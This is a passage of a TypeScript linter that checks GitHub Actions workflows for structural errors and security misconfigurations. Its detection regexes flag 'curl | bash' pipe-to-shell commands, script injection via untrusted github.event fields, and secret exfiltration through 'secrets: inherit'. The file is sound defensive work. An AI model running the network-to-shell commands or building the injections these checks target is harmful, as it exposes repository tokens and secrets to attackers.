/**
 * GitHub Actions Validator — a CLIENT-SIDE, dependency-free checker that parses
 * a GitHub Actions workflow YAML and reports structural errors plus SECURITY
 * misconfigurations.
 *
 * ┌──────────────────────────────────────────────────────────────────────────┐
 * │  WHAT THIS IS                                                              │
 * │                                                                            │
 * │  A pragmatic, in-browser linter focused on the security mistakes that      │
 * │  actually leak repository write access or secrets:                         │
 * │                                                                            │
 * │    • pull_request_target + checkout of the PR head  → runs UNTRUSTED code  │
 * │      with a privileged token (the classic "pwn request").                  │
 * │    • script injection — untrusted ${{ github.event.* }} expanded straight  │
 * │      into a shell `run:` block.                                            │
 * │    • unpinned third-party actions — `uses: owner/repo@v4` / `@main` can be │
 * │      moved to malicious code; pin to a full 40-char commit SHA.            │
 * │    • over-broad or implicit permissions — `write-all` or no top-level      │
 * │      `permissions:` (the default token is broader than most jobs need).    │
 * │    • `curl … | bash` / `wget … | sh` — piping the network into a shell.    │
 * │    • secrets used in pull_request-triggered workflows (forks).             │
 * │                                                                            │
 * │  It parses YAML for structure, then runs a RAW LINE SCAN to attach honest  │
 * │  line numbers to each finding (GitHub expressions and shell snippets are   │
 * │  easier to locate textually than via the parsed tree). It never throws:    │
 * │  a YAML parse failure returns { ok:false, error } with zero findings.      │
 * └──────────────────────────────────────────────────────────────────────────┘
 */

// js-yaml v4 ships ESM but no bundled type declarations, and @types/js-yaml is
// not a project dependency. Declare the tiny surface we use so the project
// type-checks under strict mode without adding a dependency.
declare module 'js-yaml' {
  export function load(input: string, options?: unknown): unknown;
  const _default: { load: typeof load };
  export default _default;
}

import yaml from 'js-yaml';
import type { Finding, Severity, ValidateResult } from './types';

/* ────────────────────────────────────────────────────────────────────────── *
 *  Parsed-document shapes (loose — user input is validated as we read it).
 * ────────────────────────────────────────────────────────────────────────── */

interface WorkflowStep {
  uses?: unknown;
  run?: unknown;
  with?: Record<string, unknown>;
  name?: unknown;
  id?: unknown;
}

interface WorkflowJob {
  'runs-on'?: unknown;
  uses?: unknown;
  steps?: unknown;
  permissions?: unknown;
  needs?: unknown;
}

/**
 * A job paired with the source lines we resolved for it. Built ONCE (see
 * `indexJobs`) and shared by the structural and security passes so every
 * per-job / per-step finding can point at its own line instead of collapsing
 * onto the job header.
 */
interface JobEntry {
  id: string;
  raw: unknown;
  /** 1-based line of the `<job-id>:` key, when locatable. */
  line?: number;
  /** 1-based line of each `- ` sequence item under this job's `steps:`. */
  stepLines: number[];
}

interface Workflow {
  on?: unknown;
  jobs?: unknown;
  permissions?: unknown;
  name?: unknown;
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Small helpers.
 * ────────────────────────────────────────────────────────────────────────── */

function isRecord(v: unknown): v is Record<string, unknown> {
  return typeof v === 'object' && v !== null && !Array.isArray(v);
}

/** Coerce a YAML scalar that may be a string into a trimmed string (else ''). */
function asString(v: unknown): string {
  return typeof v === 'string' ? v : '';
}

/**
 * Best-effort line-referenced description of a js-yaml parse error. Mirrors the
 * AlertLint engine so error messaging is consistent across tools.
 */
function describeYamlError(e: unknown): string {
  if (e && typeof e === 'object') {
    const err = e as {
      reason?: string;
      mark?: { line?: number; column?: number };
      message?: string;
    };
    if (err.reason && err.mark && typeof err.mark.line === 'number') {
      return `${err.reason} (line ${err.mark.line + 1}, column ${(err.mark.column ?? 0) + 1}).`;
    }
    if (err.message) return err.message;
  }
  return String(e);
}

/**
 * Find the 1-based line number of the first raw line matching `test`, optionally
 * starting the search at `fromLine` (1-based). Returns undefined if not found.
 * Used to attach honest line numbers to findings located by text scan.
 */
function findLine(
  lines: string[],
  test: (line: string) => boolean,
  fromLine = 1,
): number | undefined {
  for (let i = Math.max(0, fromLine - 1); i < lines.length; i++) {
    if (test(lines[i])) return i + 1;
  }
  return undefined;
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/** Width of a line's leading whitespace (YAML forbids tabs for indentation). */
function indentOf(line: string): number {
  return line.length - line.replace(/^[ \t]+/, '').length;
}

/** Blank lines and whole-line comments carry no structure — skip them. */
function isSkippableLine(line: string): boolean {
  return line.trim() === '' || /^\s*#/.test(line);
}

/**
 * 1-based line of a DIRECT child key of the job declared at `jobLine`.
 * Scoped by indentation so a `needs:`/`steps:` nested deeper (inside a `with:`
 * block, say) can never be mistaken for the job's own key.
 */
function findJobChildLine(
  lines: string[],
  jobLine: number | undefined,
  key: string,
): number | undefined {
  if (jobLine === undefined || jobLine < 1 || jobLine > lines.length) return undefined;
  const jobIndent = indentOf(lines[jobLine - 1]);
  const re = new RegExp(`^\\s*${escapeRegExp(key)}\\s*:`);
  let bodyIndent = -1;
  for (let i = jobLine; i < lines.length; i++) {
    const l = lines[i];
    if (isSkippableLine(l)) continue;
    const ind = indentOf(l);
    if (ind <= jobIndent) break; // dedent → left this job's block
    if (bodyIndent === -1) bodyIndent = ind;
    if (ind === bodyIndent && re.test(l)) return i + 1;
  }
  return undefined;
}

/**
 * Resolve the 1-based source line of EACH `- ` sequence item under a job's
 * `steps:` key. YAML allows the items to sit at the same indent as `steps:` or
 * deeper, so the first item fixes the item indent and siblings must match it.
 * Returns [] when the block cannot be located — callers fall back to the job line.
 */
function findStepLines(lines: string[], jobLine: number | undefined): number[] {
  const stepsLine = findJobChildLine(lines, jobLine, 'steps');
  if (stepsLine === undefined) return [];
  const stepsIndent = indentOf(lines[stepsLine - 1]);

  const out: number[] = [];
  let itemIndent = -1;
  for (let i = stepsLine; i < lines.length; i++) {
    const l = lines[i];
    if (isSkippableLine(l)) continue;
    const ind = indentOf(l);
    if (ind < stepsIndent) break; // dedent out of the job entirely
    const isItem = /^\s*-(\s|$)/.test(l);
    if (itemIndent === -1) {
      if (!isItem) break; // `steps:` is not a sequence — nothing to index
      itemIndent = ind;
    }
    if (ind < itemIndent) break; // sibling key of `steps:`
    if (ind === itemIndent) {
      if (!isItem) break; // a sibling key at the item indent ends the list
      out.push(i + 1);
    }
    // Deeper lines belong to the step already recorded.
  }
  return out;
}

/**
 * Pair every job with its source lines, ONCE. Job keys are searched in document
 * order from a moving cursor (falling back to a full scan below `jobs:`) so two
 * jobs never resolve to the same line.
 */
function indexJobs(wf: Workflow, lines: string[]): JobEntry[] {
  if (!isRecord(wf.jobs)) return [];
  const jobsLine = findLine(lines, (l) => /^\s*jobs\s*:/.test(l)) ?? 1;
  let cursor = jobsLine + 1;

  return Object.entries(wf.jobs as Record<string, unknown>).map(([id, raw]) => {
    const test = (l: string) => new RegExp(`^\\s+${escapeRegExp(id)}\\s*:`).test(l);
    const line = findLine(lines, test, cursor) ?? findLine(lines, test, jobsLine + 1);
    if (line !== undefined) cursor = line + 1;
    return { id, raw, line, stepLines: findStepLines(lines, line) };
  });
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Security-detection regexes (documented at their use sites).
 * ────────────────────────────────────────────────────────────────────────── */

/**
 * Untrusted GitHub-context expressions an attacker controls via a PR/issue/comment.
 * These are the classic script-injection vectors: their *values* are attacker
 * text, so interpolating them into a shell line lets the attacker run commands.
 * (We intentionally do NOT flag safe contexts like github.sha or github.ref_name
 * derived server-side, nor github.token.)
 */
const UNTRUSTED_CONTEXT_RE =
  /\$\{\{\s*(?:github\.event\.(?:issue|pull_request|comment|review|discussion|head_commit)?\.?(?:title|body|head_ref|label\.name|user\.login|description|message)|github\.head_ref|github\.event\.pull_request\.head\.ref|github\.event\.pull_request\.head\.label|github\.event\.pull_request\.head\.repo\.full_name|github\.event\.commits|github\.event\.pages|github\.event\.client_payload(?:\.[\w.]+)?|github\.event\.inputs\.[\w-]+|github\.event\.workflow_run\.head_branch)\b[^}]*\}\}/i;

/** Any `${{ ... }}` GitHub expression, used to scope the injection scan to run blocks. */
const ANY_EXPRESSION_RE = /\$\{\{[^}]*\}\}/;

/** `uses: owner/repo@ref` — captures owner, repo path and the ref after `@`. */
const USES_REF_RE = /^([\w.-]+)\/([\w./-]+)@(.+)$/;

/** A full 40-char (or longer, e.g. SHA-256) hex commit SHA — the safe pin target. */
const FULL_SHA_RE = /^[0-9a-f]{40,}$/i;

/** `curl … | bash` / `wget … | sh` (and `| sudo bash`, `|sh`, etc.). */
const PIPE_TO_SHELL_RE =
  /(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b/i;

/* ────────────────────────────────────────────────────────────────────────── *
 *  Public API.
 * ────────────────────────────────────────────────────────────────────────── */

/**
 * Validate a GitHub Actions workflow YAML. NEVER throws: a parse failure returns
 * { ok:false, error }, an empty document returns a single structural error, and
 * any unexpected internal error is caught and surfaced as a generic error.
 */
export function validate(yamlText: string): ValidateResult {
  const empty = { errors: 0, warnings: 0, infos: 0 };

  // 0. Defensive: the contract is `string`, but never throw even if a caller
  // passes null/undefined/non-string at runtime.
  if (typeof yamlText !== 'string') {
    return {
      ok: false,
      error: 'Paste a GitHub Actions workflow YAML to validate.',
      findings: [],
      summary: { ...empty },
    };
  }

  // Empty input is not a parse error — guide the user instead.
  if (yamlText.trim() === '') {
    return {
      ok: false,
      error: 'Paste a GitHub Actions workflow YAML to validate.',
      findings: [],
      summary: { ...empty },
    };
  }

  // 1. Parse YAML. Any failure is a line-referenced, fatal error.
  let doc: unknown;
  try {
    doc = yaml.load(yamlText);
  } catch (e) {
    return {
      ok: false,
      error: `Could not parse YAML: ${describeYamlError(e)}`,
      findings: [],
      summary: { ...empty },
    };
  }

  if (!isRecord(doc)) {
    return {
      ok: false,
      error:
        'The document is not a YAML mapping. A workflow must be a top-level object with `on:` and `jobs:` keys.',
      findings: [],
      summary: { ...empty },
    };
  }

  const lines = yamlText.split(/\r?\n/);
  const findings: Finding[] = [];
  const add = (f: Finding) => findings.push(f);

  try {
    const wf = doc as Workflow;
    // Resolve job/step source lines once and share them across both passes.
    const jobs = indexJobs(wf, lines);
    runStructuralChecks(wf, lines, jobs, add);
    runSecurityChecks(wf, lines, jobs, add);
  } catch (e) {
    // The contract says never throw. If a heuristic trips on unexpected input,
    // degrade gracefully to an info note rather than losing the whole run.
    add({
      id: 'internal-analysis-incomplete',
      severity: 'info',
      title: 'Some checks could not complete.',
      detail: `An internal check stopped early on this input (${String(e)}). Structural results above are still valid.`,
    });
  }

  return finalize(findings);
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Structural checks — is this a well-formed workflow at all?
 * ────────────────────────────────────────────────────────────────────────── */

/**
 * Every event GitHub can trigger a workflow on. A name outside this list is a
 * typo (`pusssh`) or an invented event, and the workflow will simply never run
 * — GitHub reports it only as a workflow-file error after you push.
 * Source: GitHub docs, "Events that trigger workflows".
 */
const KNOWN_EVENTS = new Set<string>([
  'branch_protection_rule',
  'check_run',
  'check_suite',
  'create',
  'delete',
  'deployment',
  'deployment_protection_rule',
  'deployment_status',
  'discussion',
  'discussion_comment',
  'fork',
  'gollum',
  'issue_comment',
  'issues',
  'label',
  'merge_group',
  'milestone',
  'page_build',
  'project',
  'project_card',
  'project_column',
  'public',
  'pull_request',
  'pull_request_review',
  'pull_request_review_comment',
  'pull_request_target',
  'push',
  'registry_package',
  'release',
  'repository_dispatch',
  'schedule',
  'status',
  'watch',
  'workflow_call',
  'workflow_dispatch',
  'workflow_run',
]);

function runStructuralChecks(
  wf: Workflow,
  lines: string[],
  jobs: JobEntry[],
  add: (f: Finding) => void,
): void {
  // A workflow MUST declare a trigger. js-yaml (YAML 1.2 core schema) keeps the
  // key `on` as the string `"on"`, so `wf.on` is the trigger value directly; an
  // empty `on:` parses to null, which we treat as a missing trigger.
  const hasOn = wf.on !== undefined && wf.on !== null;
  if (!hasOn) {
    add({
      id: 'missing-on',
      severity: 'error',
      title: 'Workflow has no `on:` trigger.',
      detail:
        'Every workflow must declare at least one event under `on:` (for example push, pull_request, or workflow_dispatch). Without it GitHub will never run the workflow.',
      line: findLine(lines, (l) => /^\s*on\s*:/.test(l)),
      remediation: 'Add a top-level `on:` block, e.g. `on: [push]` or `on: { pull_request: {} }`.',
    });
  } else {
    // Every trigger name must be a real GitHub event; a typo silently means the
    // workflow never runs.
    for (const event of collectTriggers(wf.on)) {
      if (KNOWN_EVENTS.has(event)) continue;
      add({
        id: 'unknown-trigger',
        severity: 'error',
        title: `Unknown workflow trigger “${event}”.`,
        detail:
          'GitHub only accepts a fixed set of event names under `on:`. An unrecognised name (often a typo, like `pusssh` for `push`) makes the workflow file invalid, so it never runs.',
        line:
          findLine(lines, (l) => new RegExp(`\\b${escapeRegExp(event)}\\b`).test(l)) ??
          findLine(lines, (l) => /^\s*on\s*:/.test(l)),
        remediation:
          'Use a documented event name such as `push`, `pull_request`, `workflow_dispatch`, `schedule`, or `workflow_call`.',
      });
    }
  }

  // A workflow MUST define jobs, and `jobs:` must be a mapping of job-id → job.
  if (wf.jobs === undefined || wf.jobs === null) {
    add({
      id: 'missing-jobs',
      severity: 'error',
      title: 'Workflow has no `jobs:`.',
      detail: 'A workflow must define at least one job under a top-level `jobs:` mapping.',
      line: findLine(lines, (l) => /^\s*jobs\s*:/.test(l)),
      remediation: 'Add a `jobs:` block containing one or more job definitions.',
    });
    return; // nothing more to check without jobs
  }

  if (!isRecord(wf.jobs)) {
    add({
      id: 'jobs-not-mapping',
      severity: 'error',
      title: '`jobs:` must be a mapping of job IDs to job definitions.',
      detail: 'Found `jobs:` but it is not an object. Each key under `jobs:` is a job ID.',
      line: findLine(lines, (l) => /^\s*jobs\s*:/.test(l)),
      remediation: 'Indent each job under `jobs:` as `<job-id>:` with its own `runs-on`/`steps`.',
    });
    return;
  }

  if (jobs.length === 0) {
    add({
      id: 'jobs-empty',
      severity: 'error',
      title: '`jobs:` is empty.',
      detail: 'A workflow must define at least one job.',
      line: findLine(lines, (l) => /^\s*jobs\s*:/.test(l)),
      remediation: 'Add a job under `jobs:`.',
    });
    return;
  }

  const jobIds = new Set(jobs.map((j) => j.id));
  const triggers = collectTriggers(wf.on);
  for (const job of jobs) {
    checkJob(job, lines, jobIds, triggers, add);
  }
  checkNeedsCycles(jobs, lines, jobIds, add);
}

/**
 * Validate `strategy:` — matrix builds are the most common shape on a real CI
 * fleet and the engine had no opinion about them at all.
 *
 * Scope is deliberately narrow: no combination expansion, no cross-product size
 * warnings. Just the five mistakes that produce a silently-wrong build.
 */
function checkStrategy(
  jobId: string,
  job: WorkflowJob,
  lines: string[],
  jobLine: number | undefined,
  add: (f: Finding) => void,
): void {
  const strategy = (job as { strategy?: unknown }).strategy;
  if (strategy === undefined || strategy === null) return;
  const strategyLine = findJobChildLine(lines, jobLine, 'strategy') ?? jobLine;

  if (!isRecord(strategy)) {
    add({
      id: 'strategy-shape',
      severity: 'error',
      title: `Job “${jobId}” has a \`strategy:\` that is not a mapping.`,
      detail: '`strategy:` holds `matrix:`, `fail-fast:` and `max-parallel:` keys.',
      line: strategyLine,
      remediation: 'Write `strategy:` as an object containing `matrix:`.',
    });
    return;
  }

  // fail-fast / max-parallel types. YAML quotes make "yes" a STRING, which
  // GitHub type-errors on — and which reads as correct to a human skimming it.
  if (strategy['fail-fast'] !== undefined && typeof strategy['fail-fast'] !== 'boolean') {
    add({
      id: 'strategy-fail-fast-type',
      severity: 'error',
      title: `Job “${jobId}” has a non-boolean \`fail-fast\`.`,
      detail:
        '`fail-fast` must be `true` or `false`. A quoted "true"/"yes" is a string, which GitHub rejects.',
      line: findJobChildLine(lines, strategyLine, 'fail-fast') ?? strategyLine,
      remediation: 'Write `fail-fast: false` without quotes.',
    });
  }
  const maxParallel = strategy['max-parallel'];
  if (
    maxParallel !== undefined &&
    (typeof maxParallel !== 'number' || !Number.isInteger(maxParallel) || maxParallel < 1)
  ) {
    add({
      id: 'strategy-max-parallel-type',
      severity: 'error',
      title: `Job “${jobId}” has a \`max-parallel\` that is not a positive whole number.`,
      detail: '`max-parallel` caps how many matrix jobs run at once, so it must be an integer ≥ 1.',
      line: findJobChildLine(lines, strategyLine, 'max-parallel') ?? strategyLine,
      remediation: 'Write `max-parallel: 4` (unquoted).',
    });
  }

  const matrix = strategy.matrix;
  if (matrix === undefined || matrix === null) return;
  const matrixLine = findJobChildLine(lines, strategyLine, 'matrix') ?? strategyLine;

  // A computed matrix is opaque to static analysis. Say so once, and suppress
  // the undeclared-var check rather than emit a wall of false positives.
  if (typeof matrix === 'string' && matrix.includes('${{')) {
    add({
      id: 'matrix-dynamic-unchecked',
      severity: 'info',
      title: `Job “${jobId}” builds its matrix at runtime.`,
      detail:
        'The matrix comes from an expression (typically `fromJSON` of a previous job’s output), so this validator cannot see which keys it will have and does not check `matrix.*` references in this job.',
      line: matrixLine,
      remediation:
        'Nothing to fix — just be aware the matrix variables in this job are unchecked here.',
    });
    return;
  }

  if (!isRecord(matrix)) {
    add({
      id: 'matrix-shape',
      severity: 'error',
      title: `Job “${jobId}” has a \`matrix:\` that is not a mapping.`,
      detail: '`matrix:` maps each variable name to the list of values it takes.',
      line: matrixLine,
      remediation: 'Write `matrix:` as `var-name: [value, value]` pairs.',
    });
    return;
  }

  // include/exclude must be lists of maps. A bare map is the common slip and
  // GitHub rejects it.
  const declared = new Set<string>();
  for (const [key, value] of Object.entries(matrix)) {
    if (key === 'include' || key === 'exclude') {
      if (!Array.isArray(value) || !value.every((v) => isRecord(v))) {
        add({
          id: 'matrix-include-exclude-shape',
          severity: 'error',
          title: `Job “${jobId}” has a \`${key}:\` that is not a list of mappings.`,
          detail: `\`${key}:\` under a matrix is a SEQUENCE of combinations, each one an object of variable/value pairs.`,
          line: findJobChildLine(lines, matrixLine, key) ?? matrixLine,
          remediation: `Write it as \`${key}:\` followed by \`- var: value\` items.`,
        });
        continue;
      }
      // include may introduce variables that appear nowhere else.
      if (key === 'include') {
        for (const combo of value) {
          for (const k of Object.keys(combo as Record<string, unknown>)) declared.add(k);
        }
      }
      continue;
    }
    declared.add(key);
  }

  if (declared.size === 0) {
    add({
      id: 'matrix-empty',
      severity: 'error',
      title: `Job “${jobId}” has a \`matrix:\` with no variables.`,
      detail: 'An empty matrix produces no jobs, so this job never runs.',
      line: matrixLine,
      remediation: 'Declare at least one `var-name: [values]` entry, or drop `strategy:`.',
    });
    return;
  }

  // Every matrix.<name> the job mentions must be declared, or it expands to an
  // empty string at runtime — the classic "why is my runs-on blank".
  const referenced = new Set<string>();
  for (const m of JSON.stringify(job).matchAll(/matrix\.([A-Za-z_][A-Za-z0-9_-]*)/g)) {
    referenced.add(m[1]);
  }
  const missing = [...referenced].filter((n) => !declared.has(n)).sort();
  for (const name of missing) {
    add({
      id: 'matrix-var-undeclared',
      severity: 'warning',
      title: `Job “${jobId}” uses \`matrix.${name}\`, which its matrix does not declare.`,
      detail:
        'An undeclared matrix variable expands to an empty string rather than failing, so the job runs with a blank value — a blank `runs-on:` or a command missing an argument.',
      line: matrixLine,
      remediation: `Declare \`${name}:\` under \`matrix:\` (or under an \`include:\` entry), or correct the reference. Declared here: ${[...declared].sort().join(', ')}.`,
    });
  }
}

/** A 40-char hex commit SHA is the only immutable ref GitHub accepts. */
function isImmutableRef(ref: string): boolean {
  return /^[0-9a-f]{40}$/i.test(ref);
}

/**
 * Checks for a job that CALLS a reusable workflow (`uses:` at job level rather
 * than step level). These were skipped wholesale, which mattered most for
 * `secrets: inherit`: under `pull_request_target` it hands every repository
 * secret to a workflow whose contents a fork can influence.
 */
function checkReusableJob(
  jobId: string,
  job: WorkflowJob,
  lines: string[],
  jobLine: number | undefined,
  triggers: Set<string>,
  add: (f: Finding) => void,
): void {
  const uses = asString(job.uses).trim();
  const usesLine = findJobChildLine(lines, jobLine, 'uses') ?? jobLine;

  // (1) Ref pinning. A local `./…` path is versioned with the calling repo, so
  // there is no third-party ref to pin.
  if (!uses.startsWith('./')) {
    const at = uses.lastIndexOf('@');
    const ref = at === -1 ? '' : uses.slice(at + 1).trim();
    if (ref === '') {
      add({
        id: 'reusable-missing-ref',
        severity: 'error',
        title: `Job “${jobId}” calls a reusable workflow with no \`@ref\`.`,
        detail:
          'A cross-repository `uses:` must name a ref — GitHub cannot resolve the workflow without one.',
        line: usesLine,
        remediation: 'Append `@<full-40-char-commit-SHA>` to the workflow path.',
      });
    } else if (!isImmutableRef(ref)) {
      add({
        id: 'reusable-unpinned-ref',
        severity: 'warning',
        title: `Job “${jobId}” calls a reusable workflow pinned to “@${ref}”, which can move.`,
        detail:
          'A branch or tag ref can be repointed at different code by whoever controls that repository. The called workflow runs with your repository’s token, so a moved ref is a supply-chain foothold.',
        line: usesLine,
        remediation: `Pin to a full 40-character commit SHA, e.g. \`${uses.slice(0, at)}@8f4b7f84864484a7bf31766abe9204da3cbe65b3\`, and let Dependabot bump it.`,
      });
    }
  }

  // (2) secrets: inherit. Severity depends entirely on the trigger.
  const secrets = (job as { secrets?: unknown }).secrets;
  const inherits = typeof secrets === 'string' && secrets.trim() === 'inherit';
  const fromForkInput = triggers.has('pull_request_target') || triggers.has('workflow_run');
  if (inherits && fromForkInput) {
    add({
      id: 'reusable-secrets-inherit-prt',
      severity: 'error',
      title: `Job “${jobId}” passes \`secrets: inherit\` on a fork-influenced trigger.`,
      detail:
        '`pull_request_target` and `workflow_run` run with the base repository’s privileged token and full secret access, against input a fork controls. `secrets: inherit` forwards EVERY repository secret to the called workflow, so anything that can influence what that workflow does can exfiltrate all of them.',
      line: findJobChildLine(lines, jobLine, 'secrets') ?? usesLine,
      remediation:
        'Pass only the specific secrets the callee needs — `secrets:\\n  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}` — or move the job to a `pull_request` trigger, which has no secret access from forks.',
    });
  } else if (inherits) {
    add({
      id: 'reusable-secrets-inherit',
      severity: 'info',
      title: `Job “${jobId}” passes \`secrets: inherit\`.`,
      detail:
        'The called workflow receives every secret this repository has, not just the ones it uses. That is usually more than it needs.',
      line: findJobChildLine(lines, jobLine, 'secrets') ?? usesLine,
      remediation: 'List the individual secrets the called workflow actually reads.',
    });
  }

  // (3) Shapes. `with:` must be a map; `secrets:` a map or the literal inherit.
  if (job['with' as keyof WorkflowJob] !== undefined && !isRecord((job as { with?: unknown }).with)) {
    add({
      id: 'reusable-with-shape',
      severity: 'error',
      title: `Job “${jobId}” has a \`with:\` that is not a mapping.`,
      detail: '`with:` passes named inputs to the called workflow, so it must be a key/value map.',
      line: findJobChildLine(lines, jobLine, 'with') ?? usesLine,
      remediation: 'Write `with:` as `input-name: value` pairs.',
    });
  }
  if (secrets !== undefined && secrets !== null && !inherits && !isRecord(secrets)) {
    add({
      id: 'reusable-secrets-shape',
      severity: 'error',
      title: `Job “${jobId}” has a \`secrets:\` that is neither a mapping nor \`inherit\`.`,
      detail: '`secrets:` must be a key/value map, or the single word `inherit`.',
      line: findJobChildLine(lines, jobLine, 'secrets') ?? usesLine,
      remediation: 'Write `secrets:` as `SECRET_NAME: ${{ secrets.SECRET_NAME }}` pairs.',
    });
  }

  // (4) Keys GitHub forbids alongside a job-level `uses:`. `needs`, `if`,
  // `permissions`, `strategy` and `concurrency` ARE allowed — do not flag them.
  const FORBIDDEN = ['steps', 'runs-on', 'container', 'services', 'environment', 'env', 'defaults'];
  const present = FORBIDDEN.filter((k) => (job as Record<string, unknown>)[k] !== undefined);
  if (present.length > 0) {
    add({
      id: 'reusable-forbidden-keys',
      severity: 'error',
      title: `Job “${jobId}” uses a reusable workflow but also sets \`${present.join('`, `')}\`.`,
      detail:
        'A job that calls a reusable workflow delegates execution entirely. GitHub rejects the workflow if it also carries run-level keys.',
      line: usesLine,
      remediation: `Remove \`${present.join('`, `')}\` from this job — set them inside the called workflow instead.`,
    });
  }
}

/**
 * Detect cycles in the `needs:` graph. GitHub rejects a workflow whose job
 * graph contains one, so NOTHING in the file runs — but a per-job membership
 * check (which is all this engine had) sees every edge as valid and passes it.
 *
 * Iterative three-colour DFS: the job graph comes from untrusted YAML, so a
 * pathological file must not blow the call stack. One finding per distinct
 * cycle, not per member.
 */
function checkNeedsCycles(
  jobs: JobEntry[],
  lines: string[],
  jobIds: Set<string>,
  add: (f: Finding) => void,
): void {
  const graph = new Map<string, string[]>();
  const lineOf = new Map<string, number | undefined>();
  for (const job of jobs) {
    lineOf.set(job.id, job.line);
    const deps = isRecord(job.raw) ? toStringList(job.raw.needs) : [];
    // Edges to jobs that do not exist are already reported as
    // `job-needs-unknown`; following them here would turn one typo into two
    // findings, and they cannot form a cycle anyway.
    graph.set(
      job.id,
      deps.filter((d) => jobIds.has(d)),
    );
  }

  const WHITE = 0;
  const GREY = 1;
  const BLACK = 2;
  const colour = new Map<string, number>();
  const reported = new Set<string>();

  for (const start of graph.keys()) {
    if ((colour.get(start) ?? WHITE) !== WHITE) continue;
    const stack: { id: string; next: number }[] = [{ id: start, next: 0 }];
    const path: string[] = [start];
    colour.set(start, GREY);

    while (stack.length > 0) {
      const top = stack[stack.length - 1];
      const deps = graph.get(top.id) ?? [];
      if (top.next < deps.length) {
        const dep = deps[top.next];
        top.next += 1;
        const c = colour.get(dep) ?? WHITE;
        if (c === GREY) {
          // Back edge: everything from `dep` onward on the current path is the cycle.
          const cycle = [...path.slice(path.indexOf(dep)), dep];
          // Rotations of one cycle are the same cycle — key on the sorted set.
          const key = [...new Set(cycle)].sort().join('|');
          if (!reported.has(key)) {
            reported.add(key);
            add({
              id: 'job-needs-cycle',
              severity: 'error',
              title: `Jobs depend on each other in a loop: ${cycle.join(' → ')}.`,
              detail:
                'GitHub rejects a workflow whose `needs:` graph contains a cycle. The whole file is invalid, so no job in it runs — not just the ones in the loop.',
              line:
                findJobChildLine(lines, lineOf.get(cycle[0]), 'needs') ?? lineOf.get(cycle[0]),
              remediation: `Break the loop: one of these jobs must not need the other. If they genuinely need to share data, have both depend on a third job instead.`,
            });
          }
        } else if (c === WHITE) {
          colour.set(dep, GREY);
          path.push(dep);
          stack.push({ id: dep, next: 0 });
        }
      } else {
        colour.set(top.id, BLACK);
        path.pop();
        stack.pop();
      }
    }
  }
}

function checkJob(
  entry: JobEntry,
  lines: string[],
  jobIds: Set<string>,
  triggers: Set<string>,
  add: (f: Finding) => void,
): void {
  const { id: jobId, raw: rawJob, line: jobLine, stepLines } = entry;

  if (!isRecord(rawJob)) {
    add({
      id: 'job-not-mapping',
      severity: 'error',
      title: `Job “${jobId}” is not a mapping.`,
      detail: 'Each job must be an object with at least `runs-on` (or `uses:` for a reusable workflow).',
      line: jobLine,
      remediation: 'Define the job as `<job-id>:` with `runs-on:` and `steps:` (or `uses:`).',
    });
    return;
  }

  const job = rawJob as WorkflowJob;

  // A job is valid if it either runs on a runner OR calls a reusable workflow.
  const hasRunsOn = job['runs-on'] !== undefined && job['runs-on'] !== null;
  const isReusable = typeof job.uses === 'string' && job.uses.trim() !== '';
  if (!hasRunsOn && !isReusable) {
    add({
      id: 'job-missing-runs-on',
      severity: 'error',
      title: `Job “${jobId}” has no \`runs-on\` or \`uses\`.`,
      detail:
        'A job must specify the runner it executes on (`runs-on:`) or reference a reusable workflow (`uses:`).',
      line: jobLine,
      remediation: 'Add `runs-on: ubuntu-latest` (or another runner), or `uses:` a reusable workflow.',
    });
  }

  // Every `needs:` entry must name a job that actually exists in this file —
  // GitHub rejects the whole workflow otherwise (and a rename is the usual cause).
  for (const dep of toStringList(job.needs)) {
    if (jobIds.has(dep)) continue;
    add({
      id: 'job-needs-unknown',
      severity: 'error',
      title: `Job “${jobId}” needs “${dep}”, which is not a job in this workflow.`,
      detail:
        'Every value under `needs:` must be the ID of another job in the same workflow file. A stale or misspelled ID makes the workflow invalid, so no job runs.',
      line: findJobChildLine(lines, jobLine, 'needs') ?? jobLine,
      remediation: `Point \`needs:\` at an existing job ID${
        jobIds.size ? ` (one of: ${[...jobIds].join(', ')})` : ''
      }, or remove the dependency.`,
    });
  }

  // `strategy:` is legal on BOTH runner jobs and reusable-workflow calls, so it
  // is checked before the reusable branch returns.
  checkStrategy(jobId, job, lines, jobLine, add);

  // Reusable-workflow jobs have no steps, but they are NOT unvalidatable: the
  // ref still needs pinning and `secrets: inherit` under pull_request_target is
  // a live credential-exfiltration path. This used to be a bare early return.
  if (isReusable) {
    checkReusableJob(jobId, job, lines, jobLine, triggers, add);
    return;
  }

  if (job.steps === undefined || job.steps === null) {
    add({
      id: 'job-missing-steps',
      severity: 'warning',
      title: `Job “${jobId}” has no \`steps\`.`,
      detail: 'A runner-based job with no steps does nothing. Did you forget to add steps?',
      line: jobLine,
      remediation: 'Add a `steps:` list, even if just a single `run:` or `uses:` step.',
    });
    return;
  }

  if (!Array.isArray(job.steps)) {
    add({
      id: 'steps-not-list',
      severity: 'error',
      title: `\`steps\` for job “${jobId}” must be a list.`,
      detail: 'Steps are a YAML sequence; each item is a step with `uses:` or `run:`.',
      line: jobLine,
      remediation: 'Make `steps:` a list of `- uses: …` / `- run: …` items.',
    });
    return;
  }

  job.steps.forEach((rawStep, idx) => {
    // Point each step's findings at THAT step's own line; fall back to the job
    // header only when the raw source could not be indexed.
    const stepLine = stepLines[idx] ?? jobLine;

    if (!isRecord(rawStep)) {
      add({
        id: 'step-not-mapping',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” is not a mapping.`,
        detail: 'Each step must be an object containing either `uses:` or `run:`.',
        line: stepLine,
        remediation: 'Write each step as `- uses: …` or `- run: …`.',
      });
      return;
    }
    const step = rawStep as WorkflowStep;
    const usesDeclared = Object.prototype.hasOwnProperty.call(step, 'uses');
    const hasUses = typeof step.uses === 'string' && step.uses.trim() !== '';
    const hasRun = typeof step.run === 'string' && step.run.trim() !== '';

    if (hasUses && hasRun) {
      // GitHub rejects the workflow rather than guessing which one you meant.
      add({
        id: 'step-uses-and-run',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” declares both \`uses\` and \`run\`.`,
        detail:
          'A step either invokes an action (`uses:`) or executes a shell command (`run:`) — never both. GitHub rejects a step that sets both keys.',
